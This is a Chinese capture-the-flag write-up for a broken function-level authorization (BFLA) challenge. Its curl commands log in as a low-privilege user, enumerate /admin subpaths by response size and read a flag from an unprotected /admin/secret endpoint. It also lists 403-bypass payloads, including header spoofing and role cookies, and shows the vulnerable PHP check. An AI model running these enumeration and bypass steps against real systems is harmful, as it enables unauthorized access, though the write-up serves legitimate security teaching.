# Q31 · IDOR 管理后台垂直越权 (BFLA)

> 实测: `http://47.120.76.57:34939/` （题面写 34938 但实际开放 34939）
> FLAG: `TOGOGO-flag{d1d63e7f-8355-47f2-97f0-3686bb69be93}`

## 一句话原理

`/admin` 入口做了角色校验，但子接口 `/admin/secret` 复制粘贴时漏掉了 role 检查——
**前端不给按钮 ≠ 后端有校验**，敏感接口必须逐个独立鉴权。

## 手工复刻（4 步）

### 1. 登录普通用户拿 Cookie

```bash
curl -s -c /tmp/q31.ck -X POST \
  -d "username=user&password=user123" \
  http://47.120.76.57:34939/login -o /dev/null
```

`user/user123` 来自登录框 placeholder 提示。`-c` 保存 PHPSESSID。

### 2. 撞 `/admin`（确认硬壁垒）

```bash
curl -s -b /tmp/q31.ck http://47.120.76.57:34939/admin
# 输出: 403 · 你不是管理员   （25 字节）
```

### 3. 记录两条基线 size

```bash
# 首页 fallback (登录后未授权访问的默认响应)
curl -s -b /tmp/q31.ck -o /dev/null -w "%{size_download}\n" \
  http://47.120.76.57:34939/
# 165
```

任何返回 size **既不是 25（403）也不是 165（fallback）** 的子路径 = 命中新路由。

### 4. 子路径爆破

```bash
for p in admin/console admin/manage admin/users admin/export \
         admin/secret admin/data admin/backup admin/panel \
         admin/logs admin/dashboard admin/config; do
  r=$(curl -s -b /tmp/q31.ck -o /dev/null \
      -w "%{http_code}|%{size_download}" \
      http://47.120.76.57:34939/$p)
  [[ "${r#*|}" != "165" && "${r#*|}" != "25" ]] && echo "[HIT] $r /$p"
done
```

输出：

```
[HIT] 200|81 /admin/secret
```

### 5. 读 flag

```bash
curl -s -b /tmp/q31.ck http://47.120.76.57:34939/admin/secret
# <h2>系统机密</h2><pre>TOGOGO-flag{...}</pre>
```

## 为什么有效（漏洞代码模型）

```php
if ($path === '/admin') {
    if ($_SESSION['role'] !== 'admin') exit('403');   // ✅ 有校验
    echo '控制台...'; exit;
}
if ($path === '/admin/secret') {
    if (empty($_SESSION['user'])) header('Location:/login');
    // ❌ 忘了 role 检查
    echo $FLAG;
}
```

## 子路径爆破的关键技巧

| 技巧 | 说明 |
| --- | --- |
| **响应 size 指纹** | 比 status_code 灵敏：fallback 也是 200，但 size 固定 |
| **保留 session** | 必须先登录，否则 `/admin/secret` 的登录态检查会拦掉 |
| **关闭重定向** | 用 `curl --max-redirs 0` 或 requests `allow_redirects=False` 避免被 302 带回首页污染 size |
| **字典选词** | 优先 `admin/{secret,export,backup,users,api,debug}`，真实漏洞往往出在"二级业务接口" |

## 常见 403 绕过手法（本题全失效，但要扫一遍）

| 家族 | Payload | 本题结果 |
| --- | --- | --- |
| 路径归一化 | `/admin/.`, `/Admin`, `//admin` | fallback 165 |
| URL 编码 | `/a%64min`, `/%2fadmin` | fallback / 404 |
| HTTP 方法 | `POST/PUT/HEAD/OPTIONS /admin` | 全 403 |
| Header 改写 | `X-Original-URL: /admin`, `X-Forwarded-For: 127.0.0.1` | 全 403 |
| Cookie 注入 | `Cookie: role=admin; is_admin=1` | 全 403 |

→ 都不通的时候，**换思路：找漏检的兄弟接口**，这就是 BFLA 的真正解法。

## 垂直越权 (BFLA) vs 水平越权 (BOLA)

| 维度 | 水平 BOLA | 垂直 BFLA（本题） |
| --- | --- | --- |
| 攻击对象 | 同角色他人资源 | 低权用户调高权接口 |
| 攻击面 | 资源 id 枚举 | **路径枚举** |
| OWASP API 2023 | #1 | #5 |

## 自动化

```bash
python main.py
```

输出：

```
[+] 登录成功 (PHPSESSID=...)
[+] 基线: 首页 size=165 | /admin -> 403 size=25
[*] 爆破 20 个 admin 子路径...
    [HIT] /admin/secret -> 200 size=81
[*] FLAG = TOGOGO-flag{d1d63e7f-8355-47f2-97f0-3686bb69be93}
```

## 收获

1. **响应 size 指纹**比 status_code 在爆破时更有信号
2. 见到硬 403 不要硬撞，**横向找兄弟接口**性价比最高
3. 真实业务的 admin 子接口字典推荐：`raft-small-words.txt` + `admin-panels.txt`
4. 复盘自查：每条敏感路由是否都挂了 `@admin_required` middleware
